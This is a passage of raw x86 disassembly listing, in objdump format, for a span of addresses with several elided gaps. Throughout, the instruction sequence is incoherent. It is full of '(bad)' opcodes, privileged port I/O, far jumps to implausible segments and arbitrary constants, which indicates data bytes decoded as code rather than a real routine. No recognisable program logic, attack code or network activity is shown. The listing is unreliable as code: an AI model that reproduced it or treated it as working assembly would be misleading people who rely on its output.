  42954a:	and    BYTE PTR [edi+edi*2],bl
  42954d:	pop    ebp
  42954e:	sbb    al,0x89
  429550:	test   al,0x3e
  429552:	and    al,0x8b
	...
  429570:	add    BYTE PTR [eax],al
  429572:	stos   BYTE PTR es:[edi],al
  429573:	sub    bp,WORD PTR ds:[ebp+0x5f]
  429578:	and    BYTE PTR [eax],dh
  42957a:	popa   
  42957b:	and    BYTE PTR [bx+si-0x34],dl
  42957f:	cli    
  429580:	or     DWORD PTR [eax],edx
  429582:	in     al,0x2
  429584:	mov    DWORD PTR [eax+ecx*8+0x3e],eax
  429588:	dec    esp
  429589:	mov    edi,ebx
  42958b:	xchg   edi,eax
  42958c:	pop    edx
  42958d:	sbb    BYTE PTR [ebp+eiz*8+0xeea832f],ah
  429594:	sti    
  429595:	ss sub eax,0x1d202047
  42959b:	push   eax
  42959c:	and    BYTE PTR [esp+edi*4],ah
  42959f:	or     eax,0x80c3ff45
  4295a4:	js     0x4295ca
  4295a6:	or     al,0x4
  4295a8:	test   DWORD PTR [eax+ebx*1+0x24],eax
  4295ac:	xchg   DWORD PTR [ebp+0x7c],eax
  4295af:	xchg   edi,eax
  4295b0:	inc    esp
  4295b1:	or     al,0xef
  4295b3:	inc    ebx
  4295b4:	or     al,0x89
  4295b6:	adc    BYTE PTR [eax],ah
  4295b8:	sub    al,0x89
  4295ba:	cmp    BYTE PTR [eax],ah
  4295bc:	xor    BYTE PTR [edi],cl
  4295be:	call   0xe4292f5
  4295c3:	sub    DWORD PTR [ebp+0x43],esi
  4295c6:	sub    DWORD PTR [ecx],edx
  4295c8:	shl    bh,1
  4295ca:	arpl   WORD PTR [esi],cx
  4295cc:	and    edi,esp
  4295ce:	mov    DWORD PTR [eax-0xe],ebp
  4295d1:	cmp    edx,0x27
	...
  4295f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4295f5:	inc    eax
  4295f6:	jne    0x429673
  4295f8:	icebp  
  4295f9:	in     al,0xcb
  4295fb:	out    0x5d,eax
  4295fd:	sub    eax,0xed860000
  429602:	sar    esp,cl
  429604:	fmulp  st(5),st
  429606:	in     eax,dx
  429607:	out    0xfb,eax
  429609:	push   eax
  42960a:	and    edi,esp
  42960c:	add    dl,BYTE PTR [esi]
  42960e:	ja     0x4295d8
  429610:	test   BYTE PTR [edx],ch
  429612:	sbb    BYTE PTR [ecx],ch
  429614:	repnz out dx,al
  429616:	and    ch,BYTE PTR [ecx+0x17]
  429619:	xchg   esp,eax
  42961a:	mov    edi,0x23576923
  42961f:	jae    0x429652
  429621:	cmp    esp,DWORD PTR [ebx]
  429623:	adc    bl,BYTE PTR [ebp+0x15]
  429626:	sar    bh,0x8f
  429629:	jmp    0x429622
  42962b:	imul   esi,edi,0xf923a7ab
  429631:	outs   dx,BYTE PTR ds:[esi]
  429632:	sbb    BYTE PTR [esi+0x2],dh
  429635:	daa    
  429636:	add    BYTE PTR [ebx+0x4fc80b51],cl
  42963c:	xchg   esi,eax
  42963d:	data16 sar ah,1
  429640:	fidiv  WORD PTR ds:0xdf7de7ea
  429646:	and    bh,ah
  429648:	nop
  429649:	lods   al,BYTE PTR ds:[si]
  42964b:	cmp    DWORD PTR [eax-0x22a0201d],edx
  429651:	push   ebp
  429652:	or     eax,0x3e71fc4
  429657:	mov    DWORD PTR [eax],eax
	...
  429675:	add    BYTE PTR [ebp+0x0],dl
  429678:	jmp    0xd03:0x6e966af8
  42967f:	test   BYTE PTR [esi-0x19b6710c],ah
  429685:	add    ecx,DWORD PTR ds:0xe2e02a8b
  42968b:	scas   eax,DWORD PTR es:[edi]
  42968c:	jno    0x4296ca
  42968e:	retf   0xb91c
  429691:	and    al,0xf8
  429693:	daa    
  429694:	enter  0x29b9,0x1d
  429698:	gs in  eax,dx
  42969a:	xchg   ebp,eax
  42969b:	dec    ecx
  42969c:	outs   dx,DWORD PTR ds:[esi]
  42969d:	add    BYTE PTR ds:0x1124545b,ah
  4296a3:	sub    DWORD PTR [ecx-0x3d74bd67],esp
  4296a9:	fist   WORD PTR [edx-0x48]
  4296ac:	dec    esi
  4296ad:	add    eax,0x76e70008
  4296b2:	dec    esi
  4296b3:	in     al,0xc6
  4296b5:	rcl    DWORD PTR [edi+0x52e7cac3],cl
  4296bb:	mov    DWORD PTR ds:0xb5ec64d3,esp
  4296c1:	jbe    0x429661
  4296c3:	jecxz  0x42972b
  4296c5:	add    ecx,DWORD PTR ds:0x3aaf0f00
  4296cb:	add    bh,ah
  4296cd:	or     dh,0xb
  4296d0:	ins    BYTE PTR es:[edi],dx
  4296d1:	inc    ebx
  4296d2:	ds sahf 
  4296d4:	popa   
  4296d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296d6:	out    dx,al
  4296d7:	out    dx,eax
  4296d8:	jno    0x42972c
	...
  4296f6:	add    BYTE PTR [eax],al
  4296f8:	xchg   ebp,eax
  4296f9:	aaa    
  4296fa:	jno    0x4296c4
  4296fc:	out    dx,al
  4296fd:	repz aaa 
  4296ff:	sub    al,0x29
  429701:	xchg   esi,esp
  429703:	add    ecx,DWORD PTR [esi-0x6a53c5c1]
  429709:	xchg   ebx,eax
  42970a:	add    bh,al
  42970c:	test   DWORD PTR [edi+edi*8],edi
  42970f:	popa   
  429710:	or     al,BYTE PTR [edi-0x76a2fa85]
  429716:	dec    ebx
  429717:	loope  0x429723
  429719:	sub    ch,dh
  42971b:	adc    WORD PTR [eax],ax
  42971e:	test   BYTE PTR [ecx-0x1577348b],ch
  429724:	adc    eax,DWORD PTR [esi]
  429726:	push   0xffffffed
  429728:	jbe    0x429706
  42972a:	jbe    0x429755
  42972c:	adc    DWORD PTR [eax+0x1c8196e7],esi
  429732:	cld    
  429733:	(bad)  
  429734:	(bad)  
  429735:	jle    0x429737
  429737:	in     eax,dx
  429738:	or     eax,DWORD PTR [edi]
  42973a:	push   ebp
  42973b:	pop    esi
  42973c:	jne    0x42971e
  42973e:	sub    edi,DWORD PTR [eax-0x1678b61a]
  429744:	push   cs
  429745:	sbb    edi,DWORD PTR [ecx]
  429747:	jb     0x4296f5
  429749:	add    edi,ebp
  42974b:	mov    dh,0xe6
  42974d:	and    eax,DWORD PTR [ebx-0x76fff69f]
  429753:	out    0x2f,eax
  429755:	(bad)  
  429756:	and    edx,ecx
  429758:	xchg   ecx,eax
  429759:	les    esp,FWORD PTR [edi]
  42975b:	jb     0x42975d
	...
  429779:	add    BYTE PTR [edx],dl
  42977b:	add    DWORD PTR [ebp+eax*8+0x26],0xffffffaa
  429780:	xchg   ecx,ebp
  429782:	push   cs
  429783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429784:	adc    ebx,DWORD PTR [edi-0x1679430a]
  42978a:	push   cs
  42978b:	push   eax
  42978c:	inc    BYTE PTR [ecx]
  42978e:	or     ecx,esi
  429790:	mov    edi,0x88b8cc8e
  429795:	int3   
  429796:	int    0x41
  429798:	add    ebp,ecx
  42979a:	push   ebp
  42979b:	mov    bl,ch
  42979d:	push   0xffffffe2
  42979f:	sahf   
  4297a0:	push   eax
  4297a1:	aaa    
  4297a2:	call   0x860:0xf4000b8e
  4297a9:	add    BYTE PTR [ebx],ah
  4297ab:	out    dx,eax
  4297ac:	xor    bl,0x64
  4297af:	(bad)  
  4297b0:	dec    DWORD PTR [edx+0x657f0c22]
  4297b6:	test   al,0xff
  4297b8:	mov    BYTE PTR [ebp+0x78],al
  4297bb:	dec    edi
  4297bc:	pushw  ss
  4297be:	adc    ch,ah
  4297c0:	sbb    bh,0x34
  4297c3:	inc    DWORD PTR [esi-0xbc04228]
  4297c9:	test   DWORD PTR [edi+0x78],ebp
  4297cc:	add    esi,DWORD PTR [edx]
  4297ce:	fs in  al,dx
  4297d0:	mov    es,WORD PTR [ecx]
  4297d2:	xor    al,0xff
  4297d4:	imul   ebp,DWORD PTR [edx],0x58d05f99
  4297da:	mov    esp,0xa10
	...
  4297fb:	add    BYTE PTR [ebp*2-0x412672dc],ah
  429802:	push   esp
  429803:	call   0x42861f
  429808:	imul   ecx,DWORD PTR [eax-0x30],0xf8783b50
  42980f:	push   ebx
  429810:	dec    esp
  429811:	pop    edi
  429812:	inc    esp
  429813:	jmp    FWORD PTR [ebx]
  429815:	mov    cl,bl
  429817:	push   ecx
  429818:	xchg   esp,eax
  429819:	push   ecx
  42981a:	in     al,0x56
  42981c:	lods   al,BYTE PTR ds:[esi]
  42981d:	(bad)  
  42981f:	push   ebx
  429820:	imul   esi,DWORD PTR [eax],0xfa7189f8
  429826:	in     al,0x91
  429828:	mov    ecx,0x7f80fbe0
  42982d:	(bad)  
  42982e:	jo     0x429838
  429830:	xchg   esi,esp
  429832:	fld    DWORD PTR [edi-0x4c19014c]
  429838:	ds cmp al,0x89
  42983b:	jge    0x42984a
  42983d:	dec    ebp
  42983e:	mov    ebx,0x3b75e7
  429843:	add    bh,dh
  429845:	out    dx,eax
  429846:	mov    WORD PTR [edx+0x7d],?
  429849:	loopne 0x429876
  42984b:	fiadd  DWORD PTR [eax]
  42984d:	sub    DWORD PTR [eax],eax
  42984f:	mov    DWORD PTR [edx-0x8],edx
  429852:	mov    WORD PTR [edx+0x4d],es
  429855:	fmul   DWORD PTR [edx+eax*2+0x20add871]
  42985c:	mov    dl,0xa3
  42985e:	xchg   esp,eax
  42985f:	fwait
	...
  42987c:	add    BYTE PTR [eax],al
  42987e:	xor    eax,0x42ff972f
  429883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429884:	inc    edi
  429885:	or     edx,DWORD PTR [eax-0x793d6898]
  42988b:	bound  ecx,QWORD PTR [edx-0x63444329]
  429891:	sti    
  429892:	nop
  429893:	imul   ebx,DWORD PTR [eax],0xffffffe7
  429896:	jmp    0x429828
  429898:	add    eax,DWORD PTR [eax]
  42989a:	mov    al,ch
  42989c:	xchg   edi,eax
  42989d:	cmp    BYTE PTR [ebp+0x67],dh
  4298a0:	cdq    
  4298a1:	aas    
  4298a2:	or     eax,0x8859042d
  4298a7:	fs sbb bh,ah
  4298aa:	pop    ss
  4298ab:	lahf   
  4298ac:	add    eax,DWORD PTR [eax]
  4298ae:	nop
  4298af:	out    0x97,eax
  4298b1:	and    al,0x96
  4298b3:	ins    BYTE PTR es:[edi],dx
  4298b4:	or     BYTE PTR [ecx+0x528adf48],cl
  4298ba:	shl    DWORD PTR [esi],1
  4298bc:	cmp    eax,DWORD PTR [edi+0x47891829]
  4298c2:	cmp    eax,0x8473b390
  4298c7:	pop    edi
  4298c8:	cwde   
  4298c9:	test   BYTE PTR gs:[edi-0x64],ch
  4298cd:	mov    BYTE PTR [eax+0x3b],dl
  4298d0:	inc    esi
  4298d1:	aas    
  4298d2:	adc    DWORD PTR [eax],eax
  4298d4:	call   0xe7436b03
  4298d9:	add    eax,DWORD PTR [ebx+edi*4+0x18f82ace]
  4298e0:	int    0x20
	...
  4298fe:	add    BYTE PTR [eax],al
  429900:	jmp    0x528:0xd03d707
  429907:	mov    DWORD PTR [edx+0x19],esi
  42990a:	popa   
  42990b:	cmp    ecx,DWORD PTR [edi-0x7822cb]
  429911:	sbb    BYTE PTR [ebp-0x153478e0],ah
  429917:	mov    dl,0xea
  429919:	push   esi
  42991b:	add    ecx,DWORD PTR ds:0xdd0a298b
  429921:	sbb    ah,bh
  429923:	or     edi,DWORD PTR [eax]
  429925:	repz push esi
  429927:	div    dl
  429929:	jmp    FWORD PTR [ecx+0x1b]
  42992c:	sub    ecx,DWORD PTR [edx]
  42992e:	fsub   QWORD PTR fs:[ecx]
  429931:	sbb    DWORD PTR [ebp-0x7c],esp
  429934:	xchg   edi,eax
  429935:	or     esp,edi
  429937:	xchg   esi,eax
  429938:	icebp  
  429939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42993a:	jmp    0x4298f7
  42993c:	pop    edx
  42993d:	test   al,0x9e
  42993f:	call   0x814f:0x2b9a0042
  429946:	out    0x3,al
  429948:	mov    al,dl
  42994a:	loop   0x429977
  42994c:	pop    ebx
  42994d:	push   cs
  42994e:	sub    eax,0xeec29520
  429953:	and    BYTE PTR [edx],bl
  429955:	add    al,0x12
  429957:	mov    dh,0xd1
  429959:	xchg   edx,eax
  42995a:	loop   0x4298e8
  42995c:	mov    ebp,0x29ab6a7
  429961:	add    BYTE PTR [ecx+0x6],dl
	...
  42997f:	add    BYTE PTR [eax],al
  429981:	add    BYTE PTR [eax+0x28],bl
  429984:	ja     0x42991f
  429986:	mov    dl,0x18
  429988:	dec    DWORD PTR [edi-0x11088099]
  42998e:	adc    al,BYTE PTR [esi+esi*8+0x651bfae7]
  429995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429996:	add    eax,0x8fe30af8
  42999b:	pop    eax
  42999c:	add    DWORD PTR [edx+0x21],ebp
  42999f:	add    esi,DWORD PTR [ecx+ebx*8+0x1b]
  4299a3:	mov    cs,WORD PTR [ebx]
  4299a5:	ins    BYTE PTR es:[edi],dx
  4299a6:	inc    esi
  4299a7:	add    cl,BYTE PTR [edi+0x64]
  4299aa:	std    
  4299ab:	test   DWORD PTR [esi-0x3f],0xe8ff8307
  4299b2:	adc    DWORD PTR [ebp+0x444720b],edi
  4299b8:	(bad)  
  4299b9:	in     eax,dx
  4299ba:	inc    esi
  4299bb:	add    eax,0x871d24fd
  4299c0:	inc    edx
  4299c1:	cmc    
  4299c2:	sar    ah,1
  4299c4:	pop    ss
  4299c5:	repz adc edi,DWORD PTR [esi+0x54620b]
  4299cc:	mov    DWORD PTR [edi*8+0xee15f7e],ebx
  4299d3:	adc    DWORD PTR [edi-0x27],0xcf73c081
  4299da:	push   ebx
  4299db:	xlat   BYTE PTR ds:[ebx]
  4299dc:	jnp    0x4299c7
  4299de:	push   cs
  4299df:	push   eax
  4299e0:	(bad)  
  4299e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4299e2:	mov    eax,0x2bc6b8
	...
  429a03:	add    BYTE PTR [ecx],al
  429a05:	add    BYTE PTR [ecx-0x352ed57],cl
  429a0b:	mov    ch,0xea
  429a0d:	dec    DWORD PTR [edx-0x407f295f]
  429a13:	cmc    
  429a14:	or     BYTE PTR es:[ebp-0x28f2f117],al
  429a1b:	repnz dec esi
  429a1d:	or     al,0xd7
  429a1f:	add    BYTE PTR [ebx-0x3f],dh
  429a22:	add    BYTE PTR [eax],al
  429a24:	cdq    
  429a25:	mov    ch,al
  429a27:	adc    DWORD PTR [eax],0x38
  429a2a:	dec    edi
  429a2b:	push   esi
  429a2c:	das    
  429a2d:	in     eax,dx
  429a2e:	xchg   DWORD PTR [esi+0xc],eax
  429a31:	mov    eax,DWORD PTR [esp+eax*1-0x25]
  429a35:	test   BYTE PTR [ecx-0x8],dl
  429a38:	in     eax,dx
  429a39:	inc    edi
  429a3a:	clc    
  429a3b:	test   DWORD PTR [ebp+0x64808406],ebp
  429a41:	add    eax,DWORD PTR [eax]
  429a43:	or     ebp,0x17
  429a46:	cld    
  429a47:	je     0x429a7d
  429a49:	push   0x33
  429a4b:	lea    esi,[ecx]
  429a4d:	call   0xf05a82a6
  429a52:	(bad)  
  429a53:	jmp    DWORD PTR [ebx-0x52]
  429a56:	inc    edx
  429a57:	adc    al,BYTE PTR [edi+eax*1]
  429a5a:	mov    bl,0x46
  429a5c:	inc    esp
  429a5d:	push   ebx
  429a5e:	xchg   edi,eax
  429a60:	adc    al,0x6a
  429a62:	adc    al,0x5f
  429a64:	mov    eax,ds:0xe8c877
	...
  429a85:	add    cl,dl
  429a87:	ja     0x429a85
  429a89:	push   DWORD PTR [edi-0x1b7af742]
  429a8f:	outs   dx,BYTE PTR ds:[esi]
  429a90:	or     eax,0xd489e28b
  429a95:	mov    edi,DWORD PTR [ecx+0x6be84df6]
  429a9b:	idiv   bl
  429a9d:	jmp    FWORD PTR [eax-0x3d]
  429aa0:	jno    0x429ac5
  429aa2:	addr16 retf 
  429aa4:	sti    
  429aa5:	jmp    0x429a87
  429aa7:	push   0x53dc5afe
  429aac:	sbb    BYTE PTR [ebp+0xd],dh
  429aaf:	mov    edi,DWORD PTR [ebp+0x641aac8d]
  429ab5:	push   esp
  429ab6:	or     eax,0x8fffc070
  429abb:	call   0xa6d282b4
  429ac0:	add    BYTE PTR [eax],al
  429ac2:	mov    al,ch
  429ac4:	sub    eax,ebx
  429ac6:	xchg   esi,eax
  429ac7:	arpl   WORD PTR [eax+ecx*4],bx
  429aca:	dec    ebp
  429acb:	sbb    eax,0x9195721d
  429ad0:	mov    esp,0xffe8cb07
  429ad5:	(bad)  
  429ad6:	xchg   edi,eax
  429ad7:	jecxz  0x429af8
  429ad9:	out    0xd5,eax
  429adb:	inc    ebp
  429adc:	sbb    bh,ah
  429ade:	xchg   ecx,eax
  429adf:	push   0x693ebe97
  429ae4:	mov    edx,0x415fc65d
  429ae9:	add    eax,DWORD PTR [eax]
	...
  429b07:	add    BYTE PTR ds:0x8655b4fa,cl
  429b0d:	idiv   ebx
  429b0f:	mov    bl,cl
  429b11:	sbb    al,0x87
  429b13:	jmp    0x39da03a8
  429b18:	(bad)  
  429b19:	lock (bad) 
  429b1b:	(bad)  
  429b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b1d:	sub    dh,BYTE PTR [edi-0x7311e98e]
  429b23:	ja     0x429b2a
  429b25:	add    DWORD PTR [esi+esi*2-0x4080d733],edi
  429b2c:	add    DWORD PTR [ecx+0x290d85d3],esi
  429b32:	mov    ebx,0x534cd82
  429b37:	adc    ebp,0x861726c6
  429b3d:	gs add al,0x88
  429b40:	push   ebp
  429b41:	xor    eax,DWORD PTR [edi-0x4ac8cea5]
  429b47:	mov    bl,cl
  429b49:	mov    edi,0xdafd15
  429b4e:	mov    BYTE PTR es:[edx-0x752efc74],dl
  429b55:	mov    dh,0xb3
  429b57:	mov    eax,0x88e6fccc
  429b5c:	sti    
  429b5d:	imul   DWORD PTR [ecx-0x64]
  429b60:	push   cs
  429b61:	add    BYTE PTR [ebx-0x1d],dh
  429b64:	xchg   ebp,eax
  429b65:	shr    dl,0xb0
  429b68:	xchg   ebp,eax
  429b69:	mov    ah,0xc2
  429b6b:	or     eax,DWORD PTR [eax]
	...
  429b89:	add    BYTE PTR [eax-0x7d],al
  429b8c:	pop    esi
  429b8d:	call   0xe3e91cce
  429b92:	jb     0x429bbe
  429b94:	imul   eax,DWORD PTR [ebx],0xd
  429b97:	mov    ch,0x31
  429b99:	xchg   DWORD PTR [edx+0x4a80eb8b],edi
  429b9f:	adc    eax,0x401c01d1
  429ba4:	test   al,0x7
  429ba6:	or     eax,0xfeb27605
  429bab:	mov    BYTE PTR [edi],ah
  429bad:	cld    
  429bae:	mov    eax,0xd03ae55
  429bb3:	add    BYTE PTR ds:0x19b658d9,cl
  429bb9:	pop    es
  429bba:	mov    WORD PTR [edx],ds
  429bbc:	or     dl,BYTE PTR [ecx+0x1cd6890f]
  429bc2:	int3   
  429bc3:	sti    
  429bc4:	or     al,0x89
  429bc6:	shr    ebx,cl
  429bc8:	add    BYTE PTR [ebx],al
  429bca:	mov    bl,0x86
  429bcc:	mov    dh,0xb
  429bce:	and    eax,0x91c8ac4
  429bd3:	shl    DWORD PTR [esi],1
  429bd5:	inc    eax
  429bd6:	pop    edi
  429bd7:	mov    DWORD PTR [edx],edi
  429bd9:	and    dh,0xeb
  429bdc:	data16 faddp st(4),st
  429bdf:	dec    eax
  429be0:	test   eax,0xffb10d03
  429be5:	sahf   
  429be6:	cdq    
  429be7:	add    eax,DWORD PTR [edx+ebp*2+0x1100000d]
	...
  429c0a:	add    BYTE PTR [eax],al
  429c0c:	in     al,0x23
  429c0e:	(bad)  
  429c0f:	call   0x6d4ef0a6
  429c14:	cwde   
  429c15:	(bad)  
  429c16:	(bad)  
  429c17:	call   0xe94e35a9
  429c1c:	add    DWORD PTR [ebx+ebp*2-0x16],edi
  429c20:	push   cs
  429c21:	add    BYTE PTR [ecx+0xd149e74],al
  429c27:	pop    edi
  429c28:	ins    BYTE PTR es:[edi],dx
  429c29:	(bad)  
  429c2a:	(bad)  
  429c2b:	call   0x374a2db3
  429c30:	cmp    esi,edx
  429c32:	not    dh
  429c34:	cmp    DWORD PTR es:[edi+0xc5fade],0x3a870ee9
  429c3f:	loope  0x429ca1
  429c41:	aam    0xff
  429c43:	jno    0x429bd6
  429c45:	dec    eax
  429c46:	inc    eax
  429c47:	jmp    0x9216afef
  429c4c:	mov    bl,0x22
  429c4e:	cld    
  429c4f:	sahf   
  429c50:	cwde   
  429c51:	sar    ebx,0x6a
  429c54:	and    DWORD PTR [esp+ecx*1],edx
  429c57:	gs sub bh,bh
  429c5a:	(bad)  
  429c5b:	call   0xe9c9f0c1
  429c60:	push   cs
  429c61:	add    BYTE PTR [ecx],al
  429c63:	in     al,dx
  429c64:	ret    0x4048
  429c67:	jmp    0xe9b628ff
  429c6c:	jge    0x429c68
  429c6e:	jg     0x429c51
	...
  429c8c:	add    BYTE PTR [eax],al
  429c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c8f:	adc    esi,DWORD PTR [eax-0x7]
  429c92:	daa    
  429c93:	mov    cs,WORD PTR [edi]
  429c95:	dec    esi
  429c96:	pushf  
  429c97:	pop    es
  429c98:	call   0xfc380d9d
  429c9d:	(bad)  
  429c9e:	cmp    eax,0xf4ffff18
  429ca3:	adc    ah,0x8b
  429ca6:	das    
  429ca7:	test   DWORD PTR [ecx-0x14],ebx
  429caa:	cld    
  429cab:	xchg   esp,eax
  429cac:	jmp    0x429cad
  429cae:	sub    eax,DWORD PTR [ebp-0x40180fbf]
  429cb4:	bound  ecx,QWORD PTR [ecx+0x458a0371]
  429cba:	sbb    BYTE PTR [ebp+0x411f503f],al
  429cc0:	in     al,dx
  429cc1:	xor    esp,DWORD PTR [edx-0x408b3dce]
  429cc7:	icebp  
  429cc8:	cld    
  429cc9:	add    BYTE PTR [eax],dh
  429ccb:	push   cs
  429ccc:	dec    esp
  429ccd:	jmp    ecx
  429ccf:	out    0xe4,eax
  429cd1:	cli    
  429cd2:	pop    edi
  429cd3:	idiv   bl
  429cd5:	test   BYTE PTR [esi+eax*1-0x99557c],ah
  429cdc:	dec    DWORD PTR [edx-0x4e1817cf]
  429ce2:	out    dx,eax
  429ce3:	aas    
  429ce4:	call   0xfcd55974
  429ce9:	jmp    DWORD PTR [edx+esi*1-0x26]
  429ced:	jbe    0x429cbb
  429cef:	xor    al,0x59
  429cf1:	adc    BYTE PTR [eax],al
	...
  429d0f:	add    BYTE PTR [ebx],ch
  429d11:	cmp    eax,0xf6f71059
  429d16:	lods   al,BYTE PTR ds:[esi]
  429d17:	and    BYTE PTR [edi+edi*8],0xff
  429d1b:	(bad)  
  429d1c:	and    ebx,edi
  429d1e:	out    0x60,eax
  429d20:	mov    al,0xfe
  429d22:	dec    DWORD PTR [edx-0x67da180f]
  429d28:	mov    al,ds:0x7ffffffe
  429d2d:	inc    eax
  429d2e:	call   0x7ce3aabe
  429d33:	(bad)  
  429d34:	cli    
  429d35:	sub    ch,bl
  429d37:	int    0x78
  429d39:	xor    ebx,DWORD PTR [ecx]
  429d3b:	scas   eax,DWORD PTR es:[edi]
  429d3c:	lea    ebp,[eax]
  429d3e:	add    BYTE PTR [eax],al
  429d40:	cmc    
  429d41:	and    eax,0x9ddaff7c
  429d46:	mov    edi,0x80b884eb
  429d4b:	dec    edx
  429d4d:	sub    BYTE PTR ds:0x80a8960e,ch
  429d53:	(bad)  
  429d54:	mov    edx,0x18ab328
  429d59:	and    DWORD PTR [ebx+0x7c45b54f],esi
  429d5f:	jmp    DWORD PTR [edx-0x59144063]
  429d65:	mov    dl,BYTE PTR [esi-0x79]
  429d68:	shl    ebp,0x3
  429d6b:	push   esi
  429d6c:	mov    cl,BYTE PTR [ebx]
  429d6e:	hlt    
  429d6f:	adc    ebp,ecx
  429d71:	sub    BYTE PTR [edi],dl
  429d73:	jb     0x429d75
	...
  429d91:	add    BYTE PTR ds:0x720b8c42,bl
  429d97:	ror    DWORD PTR [ebx],cl
  429d99:	std    
  429d9a:	add    BYTE PTR [ecx-0x61f2bfb9],bl
  429da0:	cmp    eax,DWORD PTR [eax-0x2782cbaf]
  429da6:	add    dl,BYTE PTR [ecx+0x290d01b3]
  429dac:	scas   al,BYTE PTR es:[edi]
  429dad:	cld    
  429dae:	pop    edx
  429daf:	popf   
  429db0:	mov    WORD PTR [edi],es
  429db2:	and    eax,0x32fc24d1
  429db7:	lea    ebx,[ebx]
  429db9:	xchg   BYTE PTR [eax+0x22fc8294],ch
  429dbf:	sbb    DWORD PTR [esp+edi*8+0xc],edi
  429dc3:	sub    DWORD PTR [eax],eax
  429dc5:	adc    DWORD PTR [eax-0x6bfba901],0x4d4882cb
  429dcf:	add    bl,bl
  429dd1:	std    
  429dd2:	test   DWORD PTR [ecx-0x41],eax
  429dd5:	dec    edx
  429dd6:	mov    al,BYTE PTR [eax]
  429dd8:	out    0x3,eax
  429dda:	or     al,0x42
  429ddc:	dec    esi
  429ddd:	pop    edi
  429dde:	lock adc DWORD PTR ds:0x63104f8b,esi
  429de5:	inc    esp
  429de6:	add    DWORD PTR [edi+edi*1+0x3],edi
  429dea:	or     eax,0x2b417200
  429def:	inc    eax
  429df0:	pop    esi
  429df1:	add    al,0xd
  429df3:	add    dl,ch
  429df5:	inc    ecx
	...
  429e12:	add    BYTE PTR [eax],al
  429e14:	mov    edi,DWORD PTR [ebx-0x525f2aee]
  429e1a:	std    
  429e1b:	mov    ss,WORD PTR [esi]
  429e1d:	jge    0x429e45
  429e1f:	fdiv   QWORD PTR [edx]
  429e21:	ins    BYTE PTR es:[edi],dx
  429e22:	popf   
  429e23:	ret    
  429e24:	xchg   edx,eax
  429e25:	sbb    esp,ecx
  429e27:	jno    0x429db2
  429e29:	adc    DWORD PTR [ecx+0x1b],esi
  429e2c:	mov    edx,DWORD PTR [ebx-0x74bc5e32]
  429e32:	rcl    BYTE PTR [ecx+0x283384e0],cl
  429e38:	sar    BYTE PTR [edi+eiz*4-0x25],0x6a
  429e3d:	cwde   
  429e3e:	sbb    BYTE PTR [eax],0x59
  429e41:	in     eax,0x8d
  429e43:	(bad)  
  429e44:	mov    dh,0x84
  429e46:	sub    ebp,DWORD PTR [eax]
  429e48:	xchg   ebp,eax
  429e49:	mov    BYTE PTR [edx+0x3],ah
  429e4c:	or     eax,0x874cea00
  429e51:	push   eax
  429e52:	add    cx,WORD PTR ds:0x8cab8f00
  429e59:	add    bh,ah
  429e5b:	jg     0x429ebf
  429e5d:	add    DWORD PTR [eax],eax
  429e5f:	ins    DWORD PTR es:[edi],dx
  429e60:	mov    ss,WORD PTR [edx]
  429e62:	cld    
  429e63:	jmp    0x732e5ce9
  429e68:	xchg   esi,eax
  429e69:	jl     0x429e6a
  429e6b:	call   0xde091b7e
  429e70:	jmp    0x0:0xe697f87
  429e77:	je     0x429e79
	...
  429e95:	add    dl,bh
  429e97:	call   0x196110ed
  429e9c:	push   esp
  429e9d:	push   0xe
  429e9f:	add    BYTE PTR [ecx+0x4a882aa4],cl
  429ea5:	cmc    
  429ea6:	cmp    edi,0x6125b8cc
  429eac:	jg     0x429e97
  429eae:	push   cs
  429eaf:	add    al,ch
  429eb1:	ret    0x1089
  429eb4:	cld    
  429eb5:	jb     0x429f22
  429eb7:	and    al,0xfe
  429eb9:	pusha  
  429eba:	and    dl,BYTE PTR [ecx]
  429ebc:	cld    
  429ebd:	jmp    0xecaa983
  429ec2:	cmp    DWORD PTR [ebp-0x72b4dd11],0x933b2221
  429ecc:	sbb    eax,0x8b049cd6
  429ed1:	push   ecx
  429ed2:	gs jg  0x429e94
  429ed5:	adc    DWORD PTR [ecx],edi
  429ed7:	mov    ah,0x80
  429ed9:	jmp    0xe7021bec
  429ede:	(bad)  
  429ee0:	(bad)  
  429ee1:	call   0x998525f4
  429ee6:	xchg   esi,eax
  429ee7:	xchg   ebp,eax
  429ee8:	neg    edx
  429eea:	adc    BYTE PTR [ebx+0x41d1c36],bl
  429ef0:	xchg   BYTE PTR [ecx+0x9],ah
  429ef3:	add    BYTE PTR [eax],al
  429ef5:	add    BYTE PTR [edi-0x2e],cl
  429ef8:	or     eax,DWORD PTR [eax+eax*1+0x0]
	...
  429f17:	add    BYTE PTR [ebx+edi*8-0x3c220001],dh
  429f1e:	cld    
  429f1f:	jmp    DWORD PTR [edx+esi*2]
  429f22:	xor    eax,0x571684d
  429f27:	push   eax
  429f28:	pop    esp
  429f29:	arpl   sp,si
  429f2b:	jmp    DWORD PTR [ebx+0x7b]
  429f2e:	inc    ecx
  429f2f:	lock outs dx,DWORD PTR ds:[esi]
  429f31:	inc    esp
  429f32:	and    al,0x8b
  429f34:	mov    eax,ds:0xa44185e7
  429f39:	jp     0x429f7c
  429f3b:	lock outs dx,DWORD PTR ds:[esi]
  429f3d:	inc    esp
  429f3e:	sub    BYTE PTR [ebx+0x4185e771],cl
  429f44:	test   al,0x7a
  429f46:	inc    ecx
  429f47:	in     al,dx
  429f48:	cmp    eax,0x698b7474
  429f4d:	out    0xc2,eax
  429f4f:	inc    eax
  429f50:	add    BYTE PTR [ebx],0x87
  429f53:	dec    ebp
  429f54:	add    BYTE PTR [ebx],ch
  429f56:	fimul  DWORD PTR [edi]
  429f58:	cmp    ah,al
  429f5a:	test   BYTE PTR [ecx+0x21],al
  429f5d:	jp     0x429fa0
  429f5f:	lock sub eax,0x398b2474
  429f65:	lock jg 0x429f28
  429f68:	add    BYTE PTR [ebp+0x7f],ch
  429f6b:	clc    
  429f6c:	mov    DWORD PTR [esi],0x3648a83
  429f72:	add    BYTE PTR [ebx+0x70fbf439],cl
  429f78:	adc    al,0xdc
  429f7a:	inc    ecx
